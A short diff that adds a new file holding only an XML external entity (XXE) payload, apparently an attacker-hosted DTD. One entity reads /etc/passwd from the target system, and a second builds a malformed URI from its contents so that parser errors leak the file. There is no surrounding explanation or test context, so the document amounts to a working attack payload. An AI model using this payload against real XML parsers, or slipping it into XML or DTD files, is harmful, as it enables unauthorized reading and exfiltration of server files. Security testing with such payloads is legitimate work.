@@ -1,0 +1,3 @@
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM ':%data;'>">
+
